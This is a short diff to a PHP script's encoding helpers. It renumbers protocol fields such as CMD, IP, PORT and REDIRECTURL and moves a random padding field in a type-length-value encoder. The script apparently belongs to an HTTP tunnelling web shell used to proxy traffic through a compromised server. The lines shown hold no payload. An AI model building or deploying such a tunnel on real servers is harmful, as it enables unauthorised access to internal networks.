@@ -24,7 +24,7 @@ function blv_decode($data) {
 function blv_encode($info) {
     $data = "";
     $info[0] = randstr();
-    $info[9] = randstr();
+    $info[39] = randstr();
 
     foreach($info as $b => $v) {
         $l = strlen($v);
@@ -43,14 +43,15 @@ function randstr() {
     return $rand;
 }
 
-$CMD         = 1;
-$MARK        = 2;
-$STATUS      = 3;
-$ERROR       = 4;
-$IP          = 5;
-$PORT        = 6;
-$REDIRECTURL = 7;
-$DATA        = 8;
+$DATA          = 1;
+$CMD           = 2;
+$MARK          = 3;
+$STATUS        = 4;
+$ERROR         = 5;
+$IP            = 6;
+$PORT          = 7;
+$REDIRECTURL   = 8;
+$FORCEREDIRECT = 9;
 
 $en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 $de = "BASE64 CHARSLIST";
